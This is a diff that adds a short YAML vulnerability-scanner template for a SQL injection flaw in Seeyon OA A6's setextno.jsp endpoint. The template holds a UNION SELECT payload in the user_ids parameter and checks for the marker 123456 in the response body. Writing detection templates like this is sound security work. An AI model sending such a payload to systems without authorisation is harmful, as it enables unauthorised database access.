@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 致远OA A6 setextno.jsp sql注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)%20union%20select%201,2,123456,4#
+  headers:
+  data:
+response1:
+  headers:
+  body: 123456
+  code: 200
+requests2:
+response2:
